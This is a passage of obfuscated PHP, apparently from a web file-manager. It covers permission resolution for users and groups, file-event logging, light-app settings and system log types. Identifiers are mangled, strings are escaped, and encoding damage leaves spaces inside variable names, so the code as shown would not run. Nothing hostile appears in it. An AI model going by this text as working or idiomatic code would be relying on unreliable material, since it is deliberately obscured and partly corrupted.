$_SERVER[Î‹ÃÂŞ„]; $ûÇ³Ø = $this->authArrayCheck($Ô èçÆ«, $ÊÉíÁƒŸ); if ($ûÇ³Ø[$¿ŠÎîĞÊ[2115]]) { $ûÇ³Ø[$¿ŠÎîĞÊ[2115]] = $this->sourceAuthInfo($ûÇ³Ø[$¿ŠÎîĞÊ[2115]]); } return $ûÇ³Ø; } public function authArrayCheck($çˆ»‡Äå, $÷ØÆÍ€â = false) { $ó´·‘ö† =& $_SERVER[Î‹ÃÂŞ„]; if (!$çˆ»‡Äå) { return array($ó´·‘ö†[458] => 0, $ó´·‘ö†[510] => !1); } $÷ØÆÍ€â = $÷ØÆÍ€â ? $÷ØÆÍ€â : USER_ID; $ ³õÛŠº = 0; $ÉÎÛöæÇ = 0; $•Ãí¯§¬ = 0; $­ºùÚ = 0; $·“¢í®ú = 0; $™¾ñ“Ú“ = 0; $Óæ½¼Â¿ = 1000; $­÷ûŞŞ˜ = 0; $”Á‹ì×ï = 0; $Ó¼ ™õ = 0; $‰õÌ›•× = 0; $¾ˆ‚“Ä… = array($ó´·‘ö†[183] => 0); foreach ($çˆ»‡Äå as $¾ˆ‚“Ä…) { $¾†ë°ÉÍ = $this->authInfo($¾ˆ‚“Ä…); if (!$¾†ë°ÉÍ) { continue; } $ÊˆĞúÖ‡ = $¾ˆ‚“Ä…[$ó´·‘ö†[541]]; $ØÔÌü˜¦ = intval($¾†ë°ÉÍ[$ó´·‘ö†[457]]); if ($¾ˆ‚“Ä…[$ó´·‘ö†[180]] == SourceModel::TYPE_USER && $ÊˆĞúÖ‡ == $÷ØÆÍ€â) { $ ³õÛŠº = !0; $•Ãí¯§¬ = $¾†ë°ÉÍ; $ÉÎÛöæÇ = $ØÔÌü˜¦; } else { if ($¾ˆ‚“Ä…[$ó´·‘ö†[180]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ÊˆĞúÖ‡, $÷ØÆÍ€â)) { $­ºùÚ = !0; $Ä’Êå–„ = $this->groupStepToUserGroup($ÊˆĞúÖ‡, $÷ØÆÍ€â); if ($Ä’Êå–„ < $Óæ½¼Â¿) { $Óæ½¼Â¿ = $Ä’Êå–„; $·“¢í®ú = $ØÔÌü˜¦; $™¾ñ“Ú“ = $¾†ë°ÉÍ; $­÷ûŞŞ˜ = $ÊˆĞúÖ‡; } if ($Ä’Êå–„ == $Óæ½¼Â¿ && $ØÔÌü˜¦ >= $·“¢í®ú) { $·“¢í®ú = $ØÔÌü˜¦; $™¾ñ“Ú“ = $¾†ë°ÉÍ; $­÷ûŞŞ˜ = $ÊˆĞúÖ‡; } } else { if ($ÊˆĞúÖ‡ == $ó´·‘ö†[214]) { $”Á‹ì×ï = !0; $‰õÌ›•× = $¾†ë°ÉÍ; $Ó¼ ™õ = $ØÔÌü˜¦; } } } } if ($ ³õÛŠº) { $ŞÓ„ËƒÂ = $ÉÎÛöæÇ; $¾†ë°ÉÍ = $•Ãí¯§¬; $ÀŠ¸¾úÊ = LNG($ó´·‘ö†[2116]); } else { if ($­ºùÚ) { $ŞÓ„ËƒÂ = $·“¢í®ú; $¾†ë°ÉÍ = $™¾ñ“Ú“; $Ì”µÕéˆ = Model($ó´·‘ö†[557])->getInfo($­÷ûŞŞ˜); $ÀŠ¸¾úÊ = $ó´·‘ö†[165] . $Ì”µÕéˆ[$ó´·‘ö†[561]] . $ó´·‘ö†[2117] . LNG($ó´·‘ö†[2118]); } else { if ($”Á‹ì×ï) { $ŞÓ„ËƒÂ = $Ó¼ ™õ; $¾†ë°ÉÍ = $‰õÌ›•×; $ÀŠ¸¾úÊ = LNG($ó´·‘ö†[2089]); } else { $ŞÓ„ËƒÂ = 0; $¾†ë°ÉÍ = !1; $ÀŠ¸¾úÊ = $ó´·‘ö†[12]; } } } $ôæˆşÀ“ = array($ó´·‘ö†[2108] => intval($ŞÓ„ËƒÂ), $ó´·‘ö†[2092] => $¾†ë°ÉÍ, $ó´·‘ö†[2109] => $ÀŠ¸¾úÊ, $ó´·‘ö†[2101] => $¾ˆ‚“Ä…[$ó´·‘ö†[183]]); return $ôæˆşÀ“; } private function groupContainUser($½Šª™íÒ, $ş‹Ãá÷· = false) { return in_array($½Šª™íÒ, $this->userGroupParents($ş‹Ãá÷·)); } private function groupStepToUserGroup($öÇÜîº, $Ûöû´£ğ = false) { $œÎÈİÏ† =& $_SERVER[Î‹ÃÂŞ„]; $•É¹È ± = $this->userGroupList($Ûöû´£ğ); $ìö¡û–ì = 1000; $–—éˆ‡– = $GLOBALS[$œÎÈİÏ†[6]][$œÎÈİÏ†[91]][$œÎÈİÏ†[2005]] == 1; $´ÒóõÖ = $–—éˆ‡– ? 3 : 2; foreach ($•É¹È ± as $éÜ’ı˜ª) { if ($éÜ’ı˜ª[$œÎÈİÏ†[1902]] == $öÇÜîº) { return 0; } $áÀÔßùÕ = explode($œÎÈİÏ†[50], trim($éÜ’ı˜ª[$œÎÈİÏ†[556]], $œÎÈİÏ†[50])); if ($áÀÔßùÕ[0] == $œÎÈİÏ†[214] && count($áÀÔßùÕ) > $´ÒóõÖ) { $ê‹ªÜ­ = array_reverse(array_slice($áÀÔßùÕ, $´ÒóõÖ)); $—Ûâ £í = array_search($öÇÜîº, $ê‹ªÜ­); if ($—Ûâ £í !== !1 && $—Ûâ £í + 1 <= $ìö¡û–ì) { $ìö¡û–ì = $—Ûâ £í + 1; } } } return $ìö¡û–ì; } private function userGroupList($È‚×½‹¾ = false) { $¥«âƒÑ´ =& $_SERVER[Î‹ÃÂŞ„]; static $ÏÕ‚ã½Æ = array(); if (isset($ÏÕ‚ã½Æ[$È‚×½‹¾])) { return $ÏÕ‚ã½Æ[$È‚×½‹¾]; } $ı†÷ŞÎ¦ = Model($¥«âƒÑ´[570])->getInfo($È‚×½‹¾); $ÏÕ‚ã½Æ[$È‚×½‹¾] = array_to_keyvalue($ı†÷ŞÎ¦[$¥«âƒÑ´[2090]], $¥«âƒÑ´[1902]); return $ÏÕ‚ã½Æ[$È‚×½‹¾]; } public function userGroupParents($úÚ©¤¢) { $õÌœ“Ÿ© =& $_SERVER[Î‹ÃÂŞ„]; static $Ú²êÉ¾€ = array(); $úÚ©¤¢ = $úÚ©¤¢ ? $úÚ©¤¢ : USER_ID; if (isset($Ú²êÉ¾€[$úÚ©¤¢])) { return $Ú²êÉ¾€[$úÚ©¤¢]; } $ÂÅ®ˆ» = $this->userGroupList($úÚ©¤¢); $¥õû„…Ş = array(); $¾ñ´£³ = $GLOBALS[$õÌœ“Ÿ©[6]][$õÌœ“Ÿ©[91]][$õÌœ“Ÿ©[2005]] == 1; $±‹’åë = $¾ñ´£³ ? 3 : 2; foreach ($ÂÅ®ˆ» as $œÅÍ˜ú‘) { $ÔöÍ•ä = array($œÅÍ˜ú‘[$õÌœ“Ÿ©[1902]]); $¦ûÒıÁ = explode($õÌœ“Ÿ©[50], trim($œÅÍ˜ú‘[$õÌœ“Ÿ©[556]], $õÌœ“Ÿ©[50])); if ($¦ûÒıÁ[0] == $õÌœ“Ÿ©[214] && count($¦ûÒıÁ) > $±‹’åë) { $«‘Ãş„¤ = array_slice($¦ûÒıÁ, $±‹’åë); $ÔöÍ•ä = array_merge($ÔöÍ•ä, array_reverse($«‘Ãş„¤)); } $¥õû„…Ş = array_merge($¥õû„…Ş, $ÔöÍ•ä); } $Ú²êÉ¾€[$úÚ©¤¢] = array_unique($¥õû„…Ş); return $Ú²êÉ¾€[$úÚ©¤¢]; } public function authTargetInfoMake($ˆÑ©‰¢Ş) { $êù€¼ƒŠ =& $_SERVER[Î‹ÃÂŞ„]; $ùÌüçÔ¢ = array(); $ÍìŸı›‹ = array(); foreach ($ˆÑ©‰¢Ş as $ä´ºÓšÒ) { if ($ä´ºÓšÒ[$êù€¼ƒŠ[180]] == SourceModel::TYPE_USER) { $ùÌüçÔ¢[] = intval($ä´ºÓšÒ[$êù€¼ƒŠ[541]]); } else { if ($ä´ºÓšÒ[$êù€¼ƒŠ[180]] == SourceModel::TYPE_GROUP) { $ÍìŸı›‹[] = intval($ä´ºÓšÒ[$êù€¼ƒŠ[541]]); } } } if ($ùÌüçÔ¢) { $ùÌüçÔ¢ = Model($êù€¼ƒŠ[549])->userListInfo($ùÌüçÔ¢); } if ($ÍìŸı›‹) { $¶õ»ÑÕ¦ = array($êù€¼ƒŠ[1990] => array($êù€¼ƒŠ[462], $ÍìŸı›‹)); $ÍìŸı›‹ = Model($êù€¼ƒŠ[557])->field($êù€¼ƒŠ[2119])->where($¶õ»ÑÕ¦)->select(); $ÍìŸı›‹ = array_to_keyvalue($ÍìŸı›‹, $êù€¼ƒŠ[1902]); } return array($êù€¼ƒŠ[2120] => $ùÌüçÔ¢, $êù€¼ƒŠ[2121] => $ÍìŸı›‹); } public function authInfo($ÛæÄßáº) { $Š²ãí =& $_SERVER[Î‹ÃÂŞ„]; if ($ÛæÄßáº[$Š²ãí[2006]]) { $£ëØƒ«¤ = Model($Š²ãí[543])->listData($ÛæÄßáº[$Š²ãí[2006]]); if (!$£ëØƒ«¤) { return !1; $Ê÷ÆÜ× = Model($Š²ãí[543])->listData(); $İ©ÙÆ«‰ = array_filter_by_field($Ê÷ÆÜ×, $Š²ãí[457], $Š²ãí[214]); return $İ©ÙÆ«‰; } $ŒÎñŞ—Ü = array_field_key($£ëØƒ«¤, array($Š²ãí[445], $Š²ãí[32], $Š²ãí[457], $Š²ãí[1925], $Š²ãí[1926])); $ŒÎñŞ—Ü[$Š²ãí[2122]] = $ÛæÄßáº; return $ŒÎñŞ—Ü; } else { return array($Š²ãí[463] => 0, $Š²ãí[1908] => $ÛæÄßáº[$Š²ãí[2067]], $Š²ãí[464] => $Š²ãí[12], $Š²ãí[1925] => $Š²ãí[2123]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\162\143\x65\137\x65\166\x65\x6e\x74"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\x69\155\x65", "\164\151\155\x65", "\151\x6e\163\x65\162\164", "\x66\165\x6e\x63\x74\x69\x6f\156"), array("\x64\145\163\x63", '', "\151\x6e\163\x65\x72\164\54\x75\160\x64\141\164\x65\x2c\163\x65\154\x65\x63\x74", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($®¢˜…ª£, $ÈøÂÔúÜ, $£§åË™Ã = '') { $‰µ€èÉ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->eventSave) { return; } $°“öÙ“Ç = Model($‰µ€èÉ[1388])->sourceInfo($®¢˜…ª£); if (!$°“öÙ“Ç) { return !1; } if ($this->isCacheEvent($°“öÙ“Ç, $ÈøÂÔúÜ)) { return; } if ($£§åË™Ã && is_string($£§åË™Ã)) { $£§åË™Ã = array($‰µ€èÉ[1941] => $£§åË™Ã); } $Ì”ŸÒ† = defined($‰µ€èÉ[2124]) ? USER_ID : 0; $‘ÒÉ¢ûË = array($‰µ€èÉ[461] => $®¢˜…ª£, $‰µ€èÉ[2125] => $°“öÙ“Ç[$‰µ€èÉ[182]], $‰µ€èÉ[2126] => $°“öÙ“Ç[$‰µ€èÉ[32]], $‰µ€èÉ[554] => !empty($°“öÙ“Ç[$‰µ€èÉ[554]]) ? $°“öÙ“Ç[$‰µ€èÉ[554]] : $‰µ€èÉ[12], $‰µ€èÉ[1695] => $Ì”ŸÒ†, $‰µ€èÉ[466] => $ÈøÂÔúÜ, $‰µ€èÉ[1697] => $£§åË™Ã); $this->addSystemLog($ÈøÂÔúÜ, $‘ÒÉ¢ûË); unset($‘ÒÉ¢ûË[$‰µ€èÉ[2126]], $‘ÒÉ¢ûË[$‰µ€èÉ[554]]); return $this->add($‘ÒÉ¢ûË); } private function addSystemLog($‡¾Š½…†, $ú¥İÔêƒ) { $ı‡Ÿ›ŒÆ =& $_SERVER[Î‹ÃÂŞ„]; if ($‡¾Š½…† == $ı‡Ÿ›ŒÆ[2127]) { $‡¾Š½…† = $ú¥İÔêƒ[$ı‡Ÿ›ŒÆ[496]][$ı‡Ÿ›ŒÆ[2128]]; } else { if (in_array($‡¾Š½…†, array($ı‡Ÿ›ŒÆ[1882], $ı‡Ÿ›ŒÆ[2129]))) { $‡¾Š½…† = $ú¥İÔêƒ[$ı‡Ÿ›ŒÆ[496]][$ı‡Ÿ›ŒÆ[801]]; } } $Æ­ƒÆ”ê = array_merge($ú¥İÔêƒ, array($ı‡Ÿ›ŒÆ[2130] => $ú¥İÔêƒ[$ı‡Ÿ›ŒÆ[183]], $ı‡Ÿ›ŒÆ[2131] => $ú¥İÔêƒ[$ı‡Ÿ›ŒÆ[2131]])); Hook::trigger($ı‡Ÿ›ŒÆ[2132], $ı‡Ÿ›ŒÆ[2133] . $‡¾Š½…†, $ú¥İÔêƒ); Model($ı‡Ÿ›ŒÆ[1846])->addLog($ı‡Ÿ›ŒÆ[2133] . $‡¾Š½…†, $Æ­ƒÆ”ê); } private function isCacheEvent($ü­ñŞãÅ, $şÃÍ–ˆ¼) { if ($ü­ñŞãÅ[$_SERVER[Î‹ÃÂŞ„][180]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($´‡İ€ŸÌ, $ê‹Ö›ûÂ) { $•¶ı—¤ï =& $_SERVER[Î‹ÃÂŞ„]; $®áãÃ¥Ş = Model($•¶ı—¤ï[1388])->sourceInfo($´‡İ€ŸÌ); $ îÑ¸¥£ = array($•¶ı—¤ï[2128] => $ê‹Ö›ûÂ, $•¶ı—¤ï[32] => $®áãÃ¥Ş[$•¶ı—¤ï[32]]); return $this->addEvent($´‡İ€ŸÌ, $•¶ı—¤ï[2127], $ îÑ¸¥£); } public function eventFileEdit($œ²±ÇûÉ) { $ğ¦œ”Å© =& $_SERVER[Î‹ÃÂŞ„]; $®ªñàğ = array($ğ¦œ”Å©[2134] => $_SERVER[$ğ¦œ”Å©[2135]], $ğ¦œ”Å©[2136] => strtolower(ACTION)); if (isset($GLOBALS[$ğ¦œ”Å©[7]][$ğ¦œ”Å©[2137]])) { $®ªñàğ[$ğ¦œ”Å©[2137]] = $ğ¦œ”Å©[90]; } return $this->addEvent($œ²±ÇûÉ, $ğ¦œ”Å©[1872], $®ªñàğ); } public function eventRecycle($À©Îœ ‚, $§‚Ô®¹¸) { return $this->addEvent($À©Îœ ‚, $_SERVER[Î‹ÃÂŞ„][2129], $§‚Ô®¹¸); } public function eventRemove($ñ§œßıÇ) { $ßñĞ™Å =& $_SERVER[Î‹ÃÂŞ„]; $ÏÈˆ°¹Ó = Model($ßñĞ™Å[1388])->sourceInfo($ñ§œßıÇ); $àÒÅ÷à™ = $ÏÈˆ°¹Ó[$ßñĞ™Å[32]]; return $this->addEvent($ÏÈˆ°¹Ó[$ßñĞ™Å[182]], $ßñĞ™Å[1871], $àÒÅ÷à™); } public function eventShare($Ô”­ÛÕş, $„»€áÕñ) { return $this->addEvent($Ô”­ÛÕş, $_SERVER[Î‹ÃÂŞ„][1882], $„»€áÕñ); } public function eventMove($ÅóÂá´», $½´Ğ·‹İ, $¹´à˜«Õ) { $¦ÌŸûàÂ =& $_SERVER[Î‹ÃÂŞ„]; $Éş£¨˜ş = Model($¦ÌŸûàÂ[1388]); $öÙâ¤şÃ = $Éş£¨˜ş->sourceInfo($ÅóÂá´»); $ü›·’Éô = $Éş£¨˜ş->sourceInfo($½´Ğ·‹İ); $·Ä˜Ú²– = $Éş£¨˜ş->sourceInfo($¹´à˜«Õ); $÷»Á‘¸Ü = array($¦ÌŸûàÂ[1215] => $½´Ğ·‹İ, $¦ÌŸûàÂ[2138] => $ü›·’Éô[$¦ÌŸûàÂ[32]], $¦ÌŸûàÂ[2115] => !empty($ü›·’Éô[$¦ÌŸûàÂ[554]]) ? $ü›·’Éô[$¦ÌŸûàÂ[554]] : $¦ÌŸûàÂ[12], $¦ÌŸûàÂ[1216] => $¹´à˜«Õ, $¦ÌŸûàÂ[2139] => $·Ä˜Ú²–[$¦ÌŸûàÂ[32]], $¦ÌŸûàÂ[2140] => !empty($·Ä˜Ú²–[$¦ÌŸûàÂ[554]]) ? $·Ä˜Ú²–[$¦ÌŸûàÂ[554]] : $¦ÌŸûàÂ[12]); $this->addEvent($ÅóÂá´», $¦ÌŸûàÂ[591], $÷»Á‘¸Ü); $öÙâ¤şÃ = $Éş£¨˜ş->sourceInfo($ÅóÂá´»); $÷»Á‘¸Ü = array($¦ÌŸûàÂ[183] => $öÙâ¤şÃ[$¦ÌŸûàÂ[183]], $¦ÌŸûàÂ[32] => $öÙâ¤şÃ[$¦ÌŸûàÂ[32]]); $this->addEvent($½´Ğ·‹İ, $¦ÌŸûàÂ[2141], $÷»Á‘¸Ü); } public function eventCopy($ù…¨œ¥) { $this->eventCreate($ù…¨œ¥, $_SERVER[Î‹ÃÂŞ„][589]); } public function eventRename($ïôßÚò, $¢Öì“Ä, $‚§Òø†) { $øşûíÂØ =& $_SERVER[Î‹ÃÂŞ„]; $±“Œ¸Ô³ = array($øşûíÂØ[1215] => $¢Öì“Ä, $øşûíÂØ[1216] => $‚§Òø†); return $this->addEvent($ïôßÚò, $øşûíÂØ[1402], $±“Œ¸Ô³); } public function eventAddComment($¸“£Î‡, $šĞÜççğ) { return $this->addEvent($¸“£Î‡, $_SERVER[Î‹ÃÂŞ„][2142], $šĞÜççğ); } public function eventAddDesc($«¾¿Û¢Ø, $µªˆËíÎ) { return $this->addEvent($«¾¿Û¢Ø, $_SERVER[Î‹ÃÂŞ„][2143], $µªˆËíÎ); } public function listBySource($›Ï éÕÊ) { $ºíÃ‰Ê =& $_SERVER[Î‹ÃÂŞ„]; $õ¿…­òï = Model($ºíÃ‰Ê[1388])->sourceInfo($›Ï éÕÊ); $Õ°ÓãÛÌ = array($ºíÃ‰Ê[461] => $›Ï éÕÊ); if ($õ¿…­òï[$ºíÃ‰Ê[455]] == $ºíÃ‰Ê[90]) { $€Ïúçê± = Model($ºíÃ‰Ê[1388])->listSearchChildren($›Ï éÕÊ, 20000); $€Ïúçê±[] = $›Ï éÕÊ . $ºíÃ‰Ê[424]; $Õ°ÓãÛÌ = array($ºíÃ‰Ê[183] => array($ºíÃ‰Ê[7], $€Ïúçê±)); } $á¼µü® = $this->where($Õ°ÓãÛÌ)->order($ºíÃ‰Ê[2144])->selectPage(); if ($á¼µü®[$ºíÃ‰Ê[412]][$ºíÃ‰Ê[413]] == 0) { $á¼µü®[$ºíÃ‰Ê[412]][$ºíÃ‰Ê[413]] = 1; $á¼µü®[$ºíÃ‰Ê[415]] = array(array($ºíÃ‰Ê[461] => $›Ï éÕÊ, $ºíÃ‰Ê[2125] => $õ¿…­òï[$ºíÃ‰Ê[182]], $ºíÃ‰Ê[1695] => $õ¿…­òï[$ºíÃ‰Ê[497]], $ºíÃ‰Ê[466] => $ºíÃ‰Ê[2145], $ºíÃ‰Ê[467] => $õ¿…­òï[$ºíÃ‰Ê[217]], $ºíÃ‰Ê[1697] => $ºíÃ‰Ê[12])); } return $this->eventListParse($á¼µü®, $›Ï éÕÊ); } private function eventListParse($¢˜•ÈÆ, $àÑÓñ­¬) { $Ó“ˆÌ±Ù =& $_SERVER[Î‹ÃÂŞ„]; $„Í²¯Å¡ = $¢˜•ÈÆ[$Ó“ˆÌ±Ù[415]]; $¯•Á¡ä® = array_to_keyvalue($„Í²¯Å¡, $Ó“ˆÌ±Ù[12], $Ó“ˆÌ±Ù[183]); $”·Œ¡øİ = array_to_keyvalue($„Í²¯Å¡, $Ó“ˆÌ±Ù[12], $Ó“ˆÌ±Ù[2131]); foreach ($„Í²¯Å¡ as $áÊ½ğ£×) { $©ù©–˜ = $áÊ½ğ£×[$Ó“ˆÌ±Ù[496]]; if ($áÊ½ğ£×[$Ó“ˆÌ±Ù[33]] == $Ó“ˆÌ±Ù[591] && isset($©ù©–˜[$Ó“ˆÌ±Ù[1215]])) { $¯•Á¡ä®[] = $©ù©–˜[$Ó“ˆÌ±Ù[1215]] . $Ó“ˆÌ±Ù[12]; $¯•Á¡ä®[] = $©ù©–˜[$Ó“ˆÌ±Ù[1216]] . $Ó“ˆÌ±Ù[12]; } if ($áÊ½ğ£×[$Ó“ˆÌ±Ù[33]] == $Ó“ˆÌ±Ù[2141] && isset($©ù©–˜[$Ó“ˆÌ±Ù[183]])) { $¯•Á¡ä®[] = $©ù©–˜[$Ó“ˆÌ±Ù[183]] . $Ó“ˆÌ±Ù[12]; } } $¯•Á¡ä® = array_merge($¯•Á¡ä®, $”·Œ¡øİ, array($àÑÓñ­¬ . $Ó“ˆÌ±Ù[12])); $¯•Á¡ä® = array_unique($¯•Á¡ä®); $ø óı¼ø = array_unique(array_to_keyvalue($„Í²¯Å¡, $Ó“ˆÌ±Ù[12], $Ó“ˆÌ±Ù[1704])); $…¨Øıò = Model($Ó“ˆÌ±Ù[570])->userListInfo($ø óı¼ø); $¸†±Ïù = Model($Ó“ˆÌ±Ù[872])->sourceListInfo($¯•Á¡ä®, !0); foreach ($„Í²¯Å¡ as &$áÊ½ğ£×) { if ($áÊ½ğ£×[$Ó“ˆÌ±Ù[33]] == $Ó“ˆÌ±Ù[591] && isset($áÊ½ğ£×[$Ó“ˆÌ±Ù[496]][$Ó“ˆÌ±Ù[1215]])) { $áÊ½ğ£×[$Ó“ˆÌ±Ù[496]][$Ó“ˆÌ±Ù[1215]] = $¸†±Ïù[$áÊ½ğ£×[$Ó“ˆÌ±Ù[496]][$Ó“ˆÌ±Ù[1215]]]; $áÊ½ğ£×[$Ó“ˆÌ±Ù[496]][$Ó“ˆÌ±Ù[1216]] = $¸†±Ïù[$áÊ½ğ£×[$Ó“ˆÌ±Ù[496]][$Ó“ˆÌ±Ù[1216]]]; } if ($áÊ½ğ£×[$Ó“ˆÌ±Ù[33]] == $Ó“ˆÌ±Ù[2141] && isset($áÊ½ğ£×[$Ó“ˆÌ±Ù[496]][$Ó“ˆÌ±Ù[183]])) { $áÊ½ğ£×[$Ó“ˆÌ±Ù[496]][$Ó“ˆÌ±Ù[183]] = $¸†±Ïù[$áÊ½ğ£×[$Ó“ˆÌ±Ù[496]][$Ó“ˆÌ±Ù[183]]]; } $áÊ½ğ£×[$Ó“ˆÌ±Ù[89]] = $¸†±Ïù[$áÊ½ğ£×[$Ó“ˆÌ±Ù[183]]]; $áÊ½ğ£×[$Ó“ˆÌ±Ù[2146]] = $¸†±Ïù[$áÊ½ğ£×[$Ó“ˆÌ±Ù[2131]]]; if ($áÊ½ğ£×[$Ó“ˆÌ±Ù[33]] == $Ó“ˆÌ±Ù[1871]) { $áÊ½ğ£×[$Ó“ˆÌ±Ù[2146]] = $áÊ½ğ£×[$Ó“ˆÌ±Ù[89]]; $áÊ½ğ£×[$Ó“ˆÌ±Ù[2131]] = $áÊ½ğ£×[$Ó“ˆÌ±Ù[2146]][$Ó“ˆÌ±Ù[183]]; $áÊ½ğ£×[$Ó“ˆÌ±Ù[89]] = !1; $áÊ½ğ£×[$Ó“ˆÌ±Ù[183]] = $Ó“ˆÌ±Ù[12]; } $áÊ½ğ£×[$Ó“ˆÌ±Ù[2075]] = $…¨Øıò[$áÊ½ğ£×[$Ó“ˆÌ±Ù[1704]]]; } unset($áÊ½ğ£×); $¢˜•ÈÆ[$Ó“ˆÌ±Ù[415]] = $„Í²¯Å¡; return $¢˜•ÈÆ; } public function removeBySource($•ö‡ì¹½) { $±Âœ¼Ûœ = array($_SERVER[Î‹ÃÂŞ„][461] => $•ö‡ì¹½); $this->where($±Âœ¼Ûœ)->remove(); } } goto dÁ‰ŠÇµõİ; Cí­ŞÄö§¬: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\114\x69\147\150\164\x41\160\160"; public $modelType = "\123\x79\163\x74\145\x6d\x4f\160\164\x69\157\x6e"; public $field = array("\x6e\x61\155\145", "\x67\x72\x6f\x75\x70", "\144\x65\x73\x63", "\143\x6f\156\x74\145\x6e\x74"); public function listData($Ï¡Ü²™ = false, $ÖÙšñÇ = "\155\157\144\x69\x66\171\124\151\155\x65", $¨ÌÄ–ŸÛ = true) { return parent::listData($Ï¡Ü²™, $ÖÙšñÇ, $¨ÌÄ–ŸÛ); } public function remove($•„‰„¢½) { $’ú ¯åÖ = $this->findByName($•„‰„¢½); if (!$’ú ¯åÖ) { return !1; } return parent::remove($’ú ¯åÖ[$_SERVER[Î‹ÃÂŞ„][445]]); } public function add($¾ØÉªîÙ) { if ($this->findByName($¾ØÉªîÙ[$_SERVER[Î‹ÃÂŞ„][32]])) { return !1; } return parent::insert($¾ØÉªîÙ); } public function update($•Êöú¯‰, $å×éÇë†) { $ÅÛÆÈ¢ =& $_SERVER[Î‹ÃÂŞ„]; $ÙğªÉ×Ó = $this->findByName($•Êöú¯‰); $üÆ‡îÌ = $this->findByName($å×éÇë†[$ÅÛÆÈ¢[32]]); if (!$ÙğªÉ×Ó || $üÆ‡îÌ && $üÆ‡îÌ[$ÅÛÆÈ¢[445]] != $ÙğªÉ×Ó[$ÅÛÆÈ¢[445]]) { return !1; } return parent::update($ÙğªÉ×Ó[$ÅÛÆÈ¢[445]], $å×éÇë†); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\155\x5f\x6c\x6f\147"; protected $dataAuto = array(array("\143\162\145\x61\164\145\124\x69\155\x65", "\x74\151\x6d\145", "\x69\x6e\163\x65\162\164", "\146\165\x6e\143\x74\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $³üÖÌó× =& $_SERVER[Î‹ÃÂŞ„]; return array($³üÖÌó×[2240] => LNG($³üÖÌó×[2241]), $³üÖÌó×[2242] => LNG($³üÖÌó×[2243]), $³üÖÌó×[1845] => LNG($³üÖÌó×[2244]), $³üÖÌó×[2245] => LNG($³üÖÌó×[2246]), $³üÖÌó×[2247] => LNG($³üÖÌó×[2248]), $³üÖÌó×[2249] => LNG($³üÖÌó×[2250]), $³üÖÌó×[2251] => LNG($³üÖÌó×[2252]), $³üÖÌó×[1875] => LNG($³üÖÌó×[2252]), $³üÖÌó×[1876] => LNG($³üÖÌó×[2253]), $³üÖÌó×[2254] => LNG($³üÖÌó×[2255]), $³üÖÌó×[2256] => LNG($³üÖÌó×[2257]), $³üÖÌó×[2258] => LNG($³üÖÌó×[2259]), $³üÖÌó×[2260] => LNG($³üÖÌó×[2261]), $³üÖÌó×[1873] => LNG($³üÖÌó×[2262]), $³üÖÌó×[2263] => LNG($³üÖÌó×[2264]), $³üÖÌó×[1880] => LNG($³üÖÌó×[2265]), $³üÖÌó×[2266] => LNG($³üÖÌó×[2267]), $³üÖÌó×[2268] => LNG($³üÖÌó×[2269]), $³üÖÌó×[2270] => LNG($³üÖÌó×[2271]), $³üÖÌó×[2272] => LNG($³üÖÌó×[2273]), $³üÖÌó×[1883] => LNG($³üÖÌó×[2274]), $³üÖÌó×[1884] => LNG($³üÖÌó×[2275]), $³üÖÌó×[2276] => LNG($³üÖÌó×[2277]), $³üÖÌó×[2278] => LNG($³üÖÌó×[2279]), $³üÖÌó×[2280] => LNG($³üÖÌó×[2281]), $³üÖÌó×[1878] => LNG($³üÖÌó×[2282]), $³üÖÌó×[2283] => LNG($³üÖÌó×[2284]), $³üÖÌó×[1877] => LNG($³üÖÌó×[2285]), $³üÖÌó×[2286] => LNG($³üÖÌó×[2287]), $³üÖÌó×[2288] => LNG($³üÖÌó×[2289]), $³üÖÌó×[2290] => LNG($³üÖÌó×[2291]), $³üÖÌó×[2292] => LNG($³üÖÌó×[2292]), $³üÖÌó×[2293] => LNG($³üÖÌó×[1849]), $³üÖÌó×[2294] => LNG($³üÖÌó×[2295]), $³üÖÌó×[2296] => LNG($³üÖÌó×[2297]), $³üÖÌó×[2298] => LNG($³üÖÌó×[2299]), $³üÖÌó×[2300] => LNG($³üÖÌó×[2301]), $³üÖÌó×[2302] => LNG($³üÖÌó×[2303]), $³üÖÌó×[2304] => LNG($³üÖÌó×[2304]), $³üÖÌó×[2305] => LNG($³üÖÌó×[2306]), $³üÖÌó×[2307] => LNG($³üÖÌó×[2308]), $³üÖÌó×[2309] => LNG($³üÖÌó×[2310]), $³üÖÌó×[2311] => LNG($³üÖÌó×[2312]), $³üÖÌó×[2313] => LNG($³üÖÌó×[2314]), $³üÖÌó×[2315] => LNG($³üÖÌó×[2316])); } private function typeFile() { $üÁğÁ¨è =& $_SERVER[Î‹ÃÂŞ„]; $âƒû ’ = array($üÁğÁ¨è[1880] => array($üÁğÁ¨è[1881]), $üÁğÁ¨è[2258] => array($üÁğÁ¨è[2317]), $üÁğÁ¨è[2260] => array($üÁğÁ¨è[2318]), $üÁğÁ¨è[1873] => array($üÁğÁ¨è[1874], $üÁğÁ¨è[2319]), $üÁğÁ¨è[2268] => array(), $üÁğÁ¨è[2270] => array(), $üÁğÁ¨è[2272] => array(), $üÁğÁ¨è[1883] => array($üÁğÁ¨è[1885]), $üÁğÁ¨è[1884] => array($üÁğÁ¨è[1885]), $üÁğÁ¨è[2276] => array($üÁğÁ¨è[2320]), $üÁğÁ¨è[2278] => array($üÁğÁ¨è[2320]), $üÁğÁ¨è[2280] => array($üÁğÁ¨è[2321]), $üÁğÁ¨è[2266] => array($üÁğÁ¨è[2322]), $üÁğÁ¨è[1878] => array($üÁğÁ¨è[2323]), $üÁğÁ¨è[2283] => array($üÁğÁ¨è[2324]), $üÁğÁ¨è[1877] => array($üÁğÁ¨è[1879])); return $âƒû ’; } private function typeAll() { $Îüƒ§¢ˆ =& $_SERVER[Î‹ÃÂŞ„]; $‚‚¼ˆî¶ = $this->typeList; $Êø‰²§À = array_filter($this->typeFile()); foreach ($Êø‰²§À as $Ê¶êõ•Ÿ => $óë€®”×) { 